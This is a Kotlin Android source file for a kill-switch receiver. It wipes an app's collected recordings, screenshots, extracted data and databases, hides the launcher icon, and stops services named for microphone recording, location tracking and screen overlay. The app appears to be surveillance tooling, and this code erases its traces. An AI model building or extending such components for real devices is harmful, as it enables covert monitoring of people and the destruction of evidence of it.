package com.anti.rootadbcontroller.services

import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.util.Log
import com.anti.rootadbcontroller.MainActivity
import java.io.File

/**
 * A BroadcastReceiver that acts as a kill switch for the application. When triggered,
 * it disables the main activity, stops all running services, and cleans up any data
 * collected by the app. This is designed as a safety measure to ensure the app
 * does not remain active indefinitely.
 */
class KillSwitchReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent?) {
        Log.d(TAG, "Kill switch triggered. Verifying and disabling app components.")

        if (intent?.action == "com.anti.rootadbcontroller.KILL_SWITCH") {
            Log.d(TAG, "Kill switch verification passed. Proceeding with cleanup.")

            // 1. Wipe collected data
            safeCleanup(context)

            // 2. Disable the main launcher activity
            val pm = context.packageManager
            val componentName = ComponentName(context, MainActivity::class.java)
            pm.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP,
            )

            // 3. Stop any running services
            context.stopService(Intent(context, MicRecorderService::class.java))
            context.stopService(Intent(context, LocationTrackerService::class.java))
            context.stopService(Intent(context, OverlayService::class.java))

            Log.d(TAG, "Kill switch procedures completed.")
        } else {
            Log.w(TAG, "Kill switch triggered with incorrect action: ${intent?.action}")
        }
    }

    /**
     * Safely cleans up files and directories created by the application.
     * This includes recordings, extracted data, and screenshots, but avoids
     * dangerous operations that could affect system stability.
     * @param context The context from which the cleanup is initiated.
     */
    private fun safeCleanup(context: Context) {
        Log.d(TAG, "Safely cleaning up collected data...")

        try {
            // Clean up app-specific external storage files
            cleanupExternalStorageFiles(context)

            // Clean up app's cache directory
            context.cacheDir?.let {
                if (it.exists()) {
                    it.deleteRecursively()
                    Log.d(TAG, "Cache directory cleaned")
                }
            }

            // Clean up app's external cache directory
            context.externalCacheDir?.let {
                if (it.exists()) {
                    it.deleteRecursively()
                    Log.d(TAG, "External cache directory cleaned")
                }
            }

            // Clear app's database files if needed
            val databaseDir = File(context.applicationInfo.dataDir, "databases")
            if (databaseDir.exists()) {
                databaseDir.listFiles()?.forEach { file ->
                    if (!file.name.contains("essential")) { // Skip essential databases
                        file.delete()
                    }
                }
                Log.d(TAG, "Database files cleaned")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error during safe cleanup", e)
        }
    }

    private fun cleanupExternalStorageFiles(context: Context) {
        val externalFilesDir = context.getExternalFilesDir(null)
        if (externalFilesDir != null && externalFilesDir.exists()) {
            deleteRecursively(externalFilesDir)
            Log.d(TAG, "External files directory cleaned")
        }
    }

    private fun deleteRecursively(fileOrDirectory: File) {
        if (fileOrDirectory.isDirectory) {
            fileOrDirectory.listFiles()?.forEach { deleteRecursively(it) }
        }
        fileOrDirectory.delete()
    }

    companion object {
        private const val TAG = "KillSwitchReceiver"
    }
}
